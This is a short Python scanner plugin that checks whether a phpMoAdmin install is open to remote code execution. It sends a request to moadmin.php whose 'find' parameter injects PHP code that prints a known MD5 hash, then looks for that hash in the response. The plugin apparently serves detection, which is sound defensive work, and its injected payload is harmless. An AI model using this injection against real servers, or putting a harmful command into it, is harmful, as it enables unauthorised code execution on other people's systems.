# !/usr/bin/env python
# encoding = utf-8

"""
reference: 'https://gist.github.com/brandonprry/0ac151a8479b48a40099'
&
'https://twitter.com/BrandonPrry/status/572800017867517952'
"""


def assign(service, arg):
    if service == 'phpmoadmin':
        return True, arg
    pass


def audit(arg):
    verify_url = arg + '/moadmin.php?db=xxx&action=listRows&collection=xxx&find=array2;'
    command = 'print(md5(3.14));exit'
    code, head, res, errcode, finalurl = curl.curl(verify_url + command)
    if code == 200:
        if '4beed3b9c4a886067de0e3a094246f78' in res:
            security_hole(verify_url)


if __name__ == "__main__":
    from dummy import *
    audit(assign('phpmoadmin', 'http://www.example.com/')[1])